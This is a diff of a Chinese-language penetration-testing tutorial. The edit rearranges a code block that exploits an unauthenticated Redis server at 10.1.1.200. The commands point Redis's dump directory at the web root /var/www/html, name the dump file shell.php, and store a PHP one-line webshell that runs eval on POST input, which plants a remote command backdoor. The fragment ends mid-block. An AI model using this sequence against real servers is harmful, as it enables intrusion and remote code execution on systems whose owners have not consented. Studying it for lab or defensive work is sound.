@@ -76,9 +76,6 @@ redis-cli -h 10.1.1.200 -p 6379
 
 **利用步骤**：
 以下是核心的操作命令序列：
-```bash
-# 1. 配置Redis持久化文件保存路径为Web根目录
-config set dir /var/www/html
 
 ![](img/d2f8f7c6232fe556e91aa6b941c9e09f_13.png)
 
@@ -86,13 +83,16 @@ config set dir /var/www/html
 
 ![](img/d2f8f7c6232fe556e91aa6b941c9e09f_17.png)
 
-# 2. 配置持久化文件名（即我们要生成的WebShell文件名）
-config set dbfilename shell.php
 
 ![](img/d2f8f7c6232fe556e91aa6b941c9e09f_19.png)
 
 ![](img/d2f8f7c6232fe556e91aa6b941c9e09f_21.png)
 
+```bash
+# 1. 配置Redis持久化文件保存路径为Web根目录
+config set dir /var/www/html
+# 2. 配置持久化文件名（即我们要生成的WebShell文件名）
+config set dbfilename shell.php
 # 3. 写入一个键值对，值为PHP一句话木马
 set x “<?php @eval($_POST[‘cmd’]);?>”
 
